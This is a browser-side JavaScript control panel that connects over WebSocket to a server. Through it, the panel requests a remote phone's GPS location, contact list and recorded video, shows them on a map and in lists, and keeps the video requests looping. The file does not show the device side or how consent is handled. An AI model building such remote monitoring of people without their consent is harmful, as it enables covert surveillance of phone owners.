window.onload = () => {

    //_________________________________________________________________files transfer logic______________________________________________________________________

    let initMap = (coords) => {
        const map = new google.maps.Map(document.getElementById('mainBox'), {zoom: 4, center: coords} );
        var marker = new google.maps.Marker( {position: coords, map: map} );
    }

    let clearLog = () => {
        var child = contacts_log.lastElementChild;  
        while (child) { 
            if (child.className == "contact")
            {
                contacts_log.removeChild(child); 
                child = contacts_log.lastElementChild; 
            }
            else break;
        }
    }

    const connect_btn = document.getElementById('connect');
    const log = document.getElementById('log');
    const contacts_log = document.getElementById('downloading_log');
    const broadcast_btn = document.getElementById('broadcast');
    const broadcast_win = document.getElementById('broadcast_window');

    let ws = null;
    let CONNECTED = false;
    let LIVE = false;

    connect_btn.addEventListener('click', () => {

        if (CONNECTED) 
        {
            ws.close(1000, "[ X ] Closed by client");
            clearLog();
        }
        else 
        {
            let remoteIP =  document.getElementById('remote').value;

            if (remoteIP == '') 
            {
                log.innerHTML = 'Incorrect address!';
                return;
            }

            ws = new WebSocket('ws://' + remoteIP + ':8080');
            ws.binaryType = 'arraybuffer';

            ws.onopen = () => {

                ws.send(JSON.stringify({
                    'command': {
                        'name': 'connect_request'
                    },
                    'client_info': {
                        'type': 'browser'
                    },
                    'identifier': '1234567'
                }));

                broadcast_btn.disabled = false;
                broadcast_btn.addEventListener('click', () => {
                    if (!LIVE)
                    {
                        broadcast_win.style.display = 'block';
                        broadcast_btn.innerHTML = 'Stop broadcasting';
                        broadcast_win.firstElementChild.src = '/static/icons/tv_test.png';
                        ws.send(JSON.stringify({
                            "command": {
                                "name": "record_video_request"
                            },
                            "client_info": {
                                "type": "browser"
                            },
                            "command_parameters" : {
                                "device_id" : "7654321" // this should be valid ios identifier
                            },
                            "identifier": "1234567" // this should be valid browser client identifier
                        }));
                        LIVE = true;
                    }
                    else
                    { 
                        broadcast_win.style.display = 'none';
                        broadcast_btn.innerHTML = 'Request broadcast';
                        LIVE = false;
                    }
                }, false);

                log.style.color = 'lightgreen';
                log.innerHTML = 'Connected!';
            }

            ws.onmessage = (event) => {

                console.log(event.data);
                let package = JSON.parse(event.data);

                if (package['command']['name'] == "record_video_response")
                {
                    let blob = new Blob([new Uint8Array(package['command_parameters']['base64_string_video'].atob())]);
                    let reader = new FileReader();
                    reader.onload = (event) => {
                        broadcast_win.firstElementChild.src = reader.result;
                    }
                    reader.readAsDataURL(blob);

                    ws.send(JSON.stringify({
                        "command": {
                            "name": "record_video_request"
                        },
                        "client_info": {
                            "type": "browser"
                        },
                        "command_parameters" : {
                            "device_id" : "7654321" // this should be valid ios identifier
                        },
                        "identifier": "1234567" // this should be valid browser client identifier
                    }));
                }
                else if (package['command']['name'] == "get_location_response")
                {
                    let location = {
                        lat: parseFloat(package['command_parameters']['location_latitude']),
                        lng: parseFloat(package['command_parameters']['location_longitude'])
                    };
                    initMap(location);

                    ws.send(JSON.stringify({
                        "command": {
                            "name": "get_contacts_request"
                        },
                        "client_info": {
                            "type": "browser"
                        },
                        "command_parameters" : {
                            "device_id" : "7654321" // this should be valid ios identifier
                        },
                        "identifier": "1234567" // this should be valid browser client identifier
                    }));
                }
                else if (package['command']['name'] == 'get_contacts_response')
                {
                    let contacts = package['command_parameters']['contacts'];
                    let keys = Object.keys(contacts);

                    for (const key of keys) {
                        let contact_name = document.createElement('li');
                        contact_name.innerText = key;

                        let contact_number = document.createElement('li');
                        contact_number.innerText = contacts[key];
                        
                        let contact_elem = document.createElement('ul');
                        contact_elem.classList.add('contact');
                        contact_elem.appendChild(contact_name);
                        contact_elem.appendChild(contact_number);

                        contacts_log.appendChild(contact_elem);
                    }
                }
                else if (package['status'] == '1' && package['command']['name'] == 'connect_response')
                {
                    ws.send(JSON.stringify({
                        "command": {
                            "name": "get_location_request"
                        },
                        "client_info": {
                            "type": "browser"
                        },
                        "command_parameters" : {
                            "device_id" : "7654321" // this should be valid ios identifier
                        },
                        "identifier": "1234567" // this should be valid browser client identifier
                    }));
                }
            }

            ws.onclose = (event) => {
                broadcast_btn.disabled = true;

                if (event.wasClean) 
                {
                    log.style.color = 'lightgreen';
                    log.innerHTML = 'Connection closed.';
                }
                else 
                {
                    log.style.color = 'red';
                    log.innerHTML = 'Error ' + event.code + ' Connection lost.';
                }

                ws = null;
            };

            ws.onerror = (error) => {
                log.style.color = 'red';
                log.innerHTML = '[!!] Error! ' + error.message;
            }
        }

        connect_btn.innerText = CONNECTED ? "Connect" : "Disconnect";
        CONNECTED = !CONNECTED;

    }, false);
}